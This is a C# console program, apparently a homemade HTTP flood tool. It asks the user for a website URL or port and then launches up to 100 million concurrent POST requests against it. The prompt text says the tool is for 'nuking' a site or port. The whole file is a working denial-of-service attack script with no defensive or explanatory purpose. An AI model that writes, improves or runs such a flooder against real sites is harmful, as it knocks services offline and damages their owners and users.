using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

class Program
{
    private static readonly HttpClient client = new HttpClient();

    static async Task Main(string[] args)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("(//////////////////////////////Yokoso!/////////////////////////////////////////////////////");
        Console.Write("Please enter a URL(write with http or https if you want to nuke an port then use http(s)://website:port to nuke an port :");
        string website = Console.ReadLine();
        Console.WriteLine($"Website: {website}");
        var tasks = new List<Task>();
        for (long i = 0; i < 100000000; i++) 
        {
            tasks.Add(PostDataAsync(website));
        }
        await Task.WhenAll(tasks);
    }

    static async Task PostDataAsync(string url)
    {
        try
        {
            HttpResponseMessage response = await client.PostAsync(url, null);
            Console.WriteLine($"Status Code: {(int)response.StatusCode} {response.StatusCode}");
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }
}
